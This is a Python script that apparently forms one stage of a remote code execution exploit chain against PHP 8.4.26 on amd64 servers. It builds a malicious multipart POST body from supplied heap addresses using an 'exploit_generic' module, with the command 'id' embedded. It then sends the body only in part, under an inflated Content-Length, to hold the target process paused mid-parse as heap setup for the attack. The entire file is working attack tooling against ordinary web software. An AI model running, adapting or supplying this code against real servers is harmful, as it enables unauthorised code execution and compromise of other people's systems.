#!/usr/bin/env python3
"""Pause terminal B after its reclaim objects have been parsed."""

from __future__ import annotations

import argparse
import dataclasses
from pathlib import Path
import socket
import sys
import time


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import exploit_generic as exploit  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--host-header")
    parser.add_argument("--profile-json")
    parser.add_argument("--set", action="append", default=[], dest="assignments")
    parser.add_argument("--main-heap", required=True, type=lambda value: int(value, 0))
    parser.add_argument("--pause", type=float, default=20.0)
    args = parser.parse_args()

    profile = exploit.load_profile(
        "php-8.4.26-amd64", args.profile_json, args.assignments
    )
    target = exploit.Target.parse(args.url)
    if args.host_header:
        target = dataclasses.replace(target, host_header=args.host_header)

    htdata = args.main_heap + profile.htdata_offset
    body, boundary = exploit.build_clean_rce_b(
        profile,
        htdata,
        0x1111111111111111,
        0x2222222222222222,
        0x3333333333333333,
        b"id",
    )
    closing = b"--" + boundary + b"--\r\n"
    if not body.endswith(closing):
        raise RuntimeError("unexpected multipart terminator")
    partial = body[: -len(closing)]
    partial += (
        b"--"
        + boundary
        + b'\r\nContent-Disposition: form-data; name="hold"\r\n\r\n'
        + b"H" * 65536
    )
    declared_length = len(partial) + 4 * 1024 * 1024
    header = (
        f"POST {target.path} HTTP/1.1\r\n"
        f"Host: {target.host_header}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode('ascii')}\r\n"
        f"Content-Length: {declared_length}\r\n"
        "Connection: close\r\n\r\n"
    ).encode("ascii")

    connection = socket.create_connection(
        (target.connect_host, target.port), timeout=30.0
    )
    connection.settimeout(30.0)
    connection.sendall(header)
    for offset in range(0, len(partial), 262_144):
        connection.sendall(partial[offset : offset + 262_144])
    print(
        f"B_PAUSED sent={len(partial)} declared={declared_length} "
        f"main={args.main_heap:#x} htdata={htdata:#x}",
        flush=True,
    )
    time.sleep(args.pause)
    connection.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
